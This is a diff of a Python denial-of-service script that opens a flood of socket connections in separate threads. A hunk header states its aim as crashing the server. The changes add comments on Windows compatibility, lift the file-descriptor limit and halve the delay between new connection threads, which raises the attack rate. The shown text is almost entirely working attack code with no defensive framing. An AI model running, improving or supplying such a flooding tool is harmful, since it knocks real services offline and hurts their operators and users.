@@ -11,7 +11,7 @@ with the intention of crashing the server. Each connection is opened as its own 
 from socket import *
 from _thread import *
 import threading
-import resource
+import resource     #resource module is not supported on windows
 import time
 import sys
 
@@ -21,7 +21,7 @@ numThreads = 0
 
 #allows us to start more threads above what would be the normal limit for your system
 #basically it lets us do as much as your computer can handle
-resource.setrlimit(resource.RLIMIT_NOFILE, (resource.RLIM_INFINITY,resource.RLIM_INFINITY))
+resource.setrlimit(resource.RLIMIT_NOFILE, (resource.RLIM_INFINITY,resource.RLIM_INFINITY)) #comment out if on windows
 
 #extrats cl arguments
 if len(sys.argv) == 4:
@@ -74,7 +74,7 @@ def singleThread():
 print('Attack has begun. Press ^C to quit.\n')
 while numThreads < numConnections:
 
-    #starts a new single thread and then sleeps an appropriate ammt of time
+    #starts a new single thread and then sleeps an appropriate ammt of time. Adjusting the sleep time affects the performance
     start_new_thread(singleThread, ())
-    time.sleep(.05)
+    time.sleep(.025)
     numThreads+=1
